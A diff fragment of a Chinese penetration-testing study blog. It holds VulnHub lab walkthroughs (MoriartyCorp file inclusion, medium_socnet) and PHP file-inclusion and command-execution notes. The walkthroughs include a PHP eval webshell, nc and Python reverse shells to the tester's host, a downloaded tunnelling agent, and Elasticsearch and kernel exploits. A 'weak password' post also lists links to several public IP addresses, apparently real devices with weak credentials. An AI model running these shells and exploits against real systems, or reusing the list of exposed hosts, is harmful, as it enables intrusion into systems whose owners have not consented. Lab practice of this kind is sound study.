+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130155717662.png" alt="image-20240130155717662"></p>
+<p><a target="_blank" rel="noopener" href="http://87.11.145.204/web/index.html">http://87.11.145.204/web/index.html</a></p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130155834408.png" alt="image-20240130155834408"></p>
+<p><a target="_blank" rel="noopener" href="http://113.183.173.183/web/index.html">http://113.183.173.183/web/index.html</a></p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130162645849.png" alt="image-20240130162645849"></p>
+<p><a target="_blank" rel="noopener" href="http://14.227.175.7/web/index.html">http://14.227.175.7/web/index.html</a></p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130162616309.png" alt="image-20240130162616309"></p>
+<p><a target="_blank" rel="noopener" href="http://113.180.28.58/web/index.html">http://113.180.28.58/web/index.html</a></p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130170620677.png" alt="image-20240130170620677"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/31/%E5%BC%B1%E5%AF%86%E7%A0%81/" data-id="cltmognau00049wu4f6wxg067" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-vulnhub靶机-MoriartyCorp" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/01/26/vulnhub%E9%9D%B6%E6%9C%BA-MoriartyCorp/" class="article-date">
+  <time class="post-time" datetime="2024-01-26T01:18:04.000Z" itemprop="datePublished">
+    <span class="post-month">1月</span><br/>
+    <span class="post-day">26</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/26/vulnhub%E9%9D%B6%E6%9C%BA-MoriartyCorp/">vulnhub靶机-MoriartyCorp（文件包含）</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/">https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/</a></p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><ol>
+<li><strong>ip扫描</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I rth0</span><br></pre></td></tr></table></figure>
+
+<p>然后根据靶机的ipv6地址找到靶机ip</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126091936057.png" alt="image-20240126091936057"></p>
+<ol start="2">
+<li><strong>端口扫描</strong></li>
+</ol>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126092304158.png" alt="image-20240126092304158"></p>
+<ol start="3">
+<li><strong>发现8000端口，直接浏览器访问，这里提示说要开始任务就得先输入flag{start}，然后提交</strong></li>
+</ol>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126092622531.png" alt="image-20240126092622531"></p>
+<h3 id="第一个flag（文件包含）"><a href="#第一个flag（文件包含）" class="headerlink" title="第一个flag（文件包含）"></a>第一个flag（文件包含）</h3><ol>
+<li><strong>根据提示打开80端口</strong></li>
+</ol>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126093116930.png" alt="image-20240126093116930"></p>
+<p>发现可能含有文件包含漏洞</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126093149376.png" alt="image-20240126093149376"></p>
+<ol start="2">
+<li><strong>尝试文件包含</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.164/?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126094446223.png" alt="image-20240126094446223"></p>
+<p>可以进行文件包含。</p>
+<ol start="3">
+<li><strong>上传一句话木马，并用蚁剑进行链接</strong></li>
+</ol>
+<p>在kali网站根目录下创建文件shell.txt,写一个一句话代码。根目录是在&#x2F;var&#x2F;www&#x2F;html下，默认端口是80。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&#x27;a&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>开启kali的apache服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+
+<p>打开网站测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.164/?file=http://192.168.2.77/shell.txt&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126111559612.png" alt="image-20240126111559612"></p>
+<p>用蚁剑进行链接</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126111808913.png" alt="image-20240126111808913"></p>
+<p>进入目录，可以在根目录的最下面找到一个1_flag.txt</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126111925982.png" alt="image-20240126111925982"></p>
+<h4 id="第一个flag（反弹shell）"><a href="#第一个flag（反弹shell）" class="headerlink" title="第一个flag（反弹shell）"></a>第一个flag（反弹shell）</h4><p>知道网站含有文件包含漏洞后，尝试进行反弹shell。</p>
+<p>kali中开启4444端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<pre><code>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.164/?file=data://text/plain,&lt;?php $a=$_GET[&quot;abc&quot;];exec($a);echo $a;?&gt;&amp;abc=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+192.168.2.77+4444+&gt;/tmp/f</span><br></pre></td></tr></table></figure>
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/26/vulnhub%E9%9D%B6%E6%9C%BA-MoriartyCorp/" data-id="cltmognas00039wu49cvnfd0o" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-文件包含" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  <time class="post-time" datetime="2024-01-25T06:11:33.000Z" itemprop="datePublished">
+    <span class="post-month">1月</span><br/>
+    <span class="post-day">25</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if ($_GET[page])&#123;</span><br><span class="line">		include $_GET[page];</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">	include &quot;home.php&quot;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查后台index.php的源码，要进行base64解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">?a=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240125145309574.png" alt="image-20240125145309574"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://input </span><br><span class="line">&lt;?php system(&quot;echo 123 &gt;&gt; wo/2.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>data:text&#x2F;plain,<?php phpinfo();?></p>
+<p>data:&#x2F;&#x2F;text&#x2F;plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 </p>
+<p>读文件</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/wo/abc.php?a=file://C:%5Cphpstudy_pro%5CWWW%5Cflash.js">http://127.0.0.1/wo/abc.php?a=file://C:\phpstudy_pro\WWW\flash.js</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cltmognau00059wu48xcfggmc" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-1-medium-socnet-ova靶机" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/01/24/1-medium-socnet-ova%E9%9D%B6%E6%9C%BA/" class="article-date">
+  <time class="post-time" datetime="2024-01-24T06:15:58.000Z" itemprop="datePublished">
+    <span class="post-month">1月</span><br/>
+    <span class="post-day">24</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/24/1-medium-socnet-ova%E9%9D%B6%E6%9C%BA/">1.medium_socnet.ova靶机easy_cloudantivirus靶机渗透练习</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-medium-socnet-ova靶机"><a href="#1-medium-socnet-ova靶机" class="headerlink" title="1.medium_socnet.ova靶机"></a>1.medium_socnet.ova靶机</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/boredhackerblog/medium_socnet.ova">https://download.vulnhub.com/boredhackerblog/medium_socnet.ova</a></p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p><strong>1.ip扫描</strong></p>
+<p>根据ipv6定位到靶机ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124195919487.png" alt="image-20240124195919487"></p>
+<p><strong>2.端口扫描</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.2.126</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124200017169.png" alt="image-20240124200017169"></p>
+<p><strong>3.尝试登入端口</strong></p>
+<p>可以登入192.168.2.126:5000</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124200131272.png" alt="image-20240124200131272"></p>
+<p><strong>4.目录扫描</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124200738702.png" alt="image-20240124200738702"></p>
+<p><strong>5.查看网页192.168.2.126:5000&#x2F;admin</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以执行命令，可以进行反弹shell。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124201155904.png" alt="image-20240124201155904"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>kali输入下面代码，进行监听端口4444.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p>网页输入，进行反弹shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.77&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124202420622.png" alt="image-20240124202420622"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124202829358.png" alt="image-20240124202829358"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124202930956.png" alt="image-20240124202930956"></p>
+<h4 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h4><ol>
+<li>内网扫描</li>
+</ol>
+<ul>
+<li>ip address 发现内网段为172.17.0.3&#x2F;16网段</li>
+<li>内网主机扫描，发现172.17.0.1，172.17.0.2，172.17.0.3为存活主机</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(seq 1 254); do ping -c 1 172.17.0.$i; done</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>部署Venom内网穿透工具</li>
+</ol>
+<ul>
+<li>在Kali主机Venom目录启动Python3 Http Server</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>启动Venom管理端，监听本地9999端口</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124203922451.png" alt="image-20240124203922451"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget -c http://192.168.2.77/agent_linux_x86</span><br><span class="line">chmod +x agent_linux_x86</span><br><span class="line">./agent_linux_x86 -rhost 192.168.2.77 -rport 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imga54a489a6a00f977d79e47e3697441f.png" alt="a54a489a6a00f977d79e47e3697441f"></p>
+<p>执行完后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img27c807bbd7893c4a017766ed6887dc5.png" alt="27c807bbd7893c4a017766ed6887dc5"></p>
+<ol start="4">
+<li>查看、控制Venom节点、启动socks隧道</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show</span><br><span class="line">goto 1</span><br><span class="line">socks 1090</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124204523220.png" alt="image-20240124204523220"></p>
+<h4 id="挂Socks内网扫描"><a href="#挂Socks内网扫描" class="headerlink" title="挂Socks内网扫描"></a>挂Socks内网扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br><span class="line">修改最后一行为：</span><br><span class="line">socks5  127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124204752824.png" alt="image-20240124204752824"></p>
+<p>挂代理启动扫描，发现172.17.0.1，172.17.0.3相同，172.17.0.2存在9200端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT -sV 172.17.0.1</span><br><span class="line">proxychains4 nmap -Pn -sT -sV 172.17.0.2</span><br><span class="line">proxychains4 nmap -Pn -sT -sV 172.17.0.3</span><br></pre></td></tr></table></figure>
+
+<p>可以扫到proxychains4 nmap -p 9200 -Pn -sT -sV 172.17.0.2</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124204952107.png" alt="image-20240124204952107"></p>
+<h4 id="利用Elasticsearch获取目标靶机登录用户名和密码"><a href="#利用Elasticsearch获取目标靶机登录用户名和密码" class="headerlink" title="利用Elasticsearch获取目标靶机登录用户名和密码"></a>利用Elasticsearch获取目标靶机登录用户名和密码</h4><p>搜索Elasticsearch漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124205112105.png" alt="image-20240124205112105"></p>
+<p>1.4.2版本可以使用第6个</p>
+<ol>
+<li>复制36337.py到当前目录，通过查看该python脚本得知该使用python2</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>向Elasticsearch写入一条数据（如果不写入数据，攻击代码无法执行）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -XPOST &#x27;172.17.0.2:9200/twitter/user/yren&#x27; -d &#x27;&#123;&quot;name&quot;:&quot;Sun&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>挂proxychains攻击172.17.0.2 9200端口</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 36337.py  172.17.0.2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124205513278.png" alt="image-20240124205513278"></p>
+<p>在根目录下发现passwords文件，内含用户名一些用户名和密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img6c1ac45a5ad8189a946af2bc44c194b.png" alt="6c1ac45a5ad8189a946af2bc44c194b"></p>
+<ol start="4">
+<li>破解MD5加密明文</li>
+</ol>
+<p>可以获得一个用户：</p>
+<p>john：1337hack</p>
+<ol start="5">
+<li>通过依次尝试，john:1337hack可以登录目标靶机</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.2.126</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124205954036.png" alt="image-20240124205954036"></p>
+<h4 id="Linux内核提权"><a href="#Linux内核提权" class="headerlink" title="Linux内核提权"></a>Linux内核提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p>提权失败</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124210139829.png" alt="image-20240124210139829"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 3.13.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124210517261.png" alt="image-20240124210517261"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/37292.c .</span><br><span class="line">注释掉37292.c的139-147行</span><br><span class="line">vim 37292.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124210803288.png" alt="image-20240124210803288"></p>
+<p>docker镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull homebrew/ubuntu16.04</span><br><span class="line">docker run -itd --name ubuntu16.04 homebrew/ubuntu16.04 /bin/bash</span><br><span class="line">docker exec -it ubuntu16.04 /bin/bash</span><br><span class="line">docker images //查看docker镜像</span><br><span class="line">docker ps //查看现在有哪些容器</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124211831780.png" alt="image-20240124211831780"></p>
+<p>复制37292.c文件到容器中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker cp 37292.c ubuntu16.04:/root/</span><br><span class="line">docker exec -it ubuntu16.04 /bin/bash</span><br><span class="line">sudo su</span><br><span class="line">cd /root</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124212046458.png" alt="image-20240124212046458"></p>
+<p>编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp 37292.c</span><br><span class="line">exit</span><br><span class="line">docker cp ubuntu16.04:/root/exp /tmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124212305672.png" alt="image-20240124212305672"></p>
+<p>查找ofs-lib.so</p>
+<p>复制ofs-lib.so文件到当前目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate ofs-lib.so</span><br><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240124212619880.png" alt="image-20240124212619880"></p>
+<ul>
+<li>将编译好的exp和ofs-lib.so上传至目标靶机</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali主机在tmp目录启动http server</span><br><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">在靶机上下载exp和ofs-lib.so</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.2.77/exp</span><br><span class="line">wget http://192.168.2.77/ofs-lib.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240125102359973.png" alt="image-20240125102359973"></p>
+<h3 id="easy-cloudantivirus靶机渗透练习"><a href="#easy-cloudantivirus靶机渗透练习" class="headerlink" title="easy_cloudantivirus靶机渗透练习"></a>easy_cloudantivirus靶机渗透练习</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/24/1-medium-socnet-ova%E9%9D%B6%E6%9C%BA/" data-id="cltmognam00009wu4d00mgffk" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
     <article id="post-命令执行" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
@@ -88,7 +912,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+      <a class="article-title" href="/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行和代码执行</a>
     </h1>
   
 
@@ -103,29 +927,224 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>命令执行：</p>
-<p>system(),passthru(),exec(),&#96;&#96;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?pp</span><br><span class="line">echo exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$_GET(&#x27;a&#x27;);</span><br><span class="line">system(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+        <p>chmod +x .&#x2F;*</p>
+<p>import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.2.77”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);</p>
+<h3 id="windows命令执行"><a href="#windows命令执行" class="headerlink" title="windows命令执行"></a>windows命令执行</h3><p>命令执行php：</p>
+<p><strong>system(),passthru(),exec(),&#96;&#96;</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">passthru(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?pp</span><br><span class="line">echo exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$_GET(&#x27;a&#x27;);</span><br><span class="line">system(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?pp</span><br><span class="line">echo `whoami`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>Windows命令连接符</p>
-<p>“&amp;”命令前面的语句为假，则直接执行后面的;前面的语句为真，命令都执行。</p>
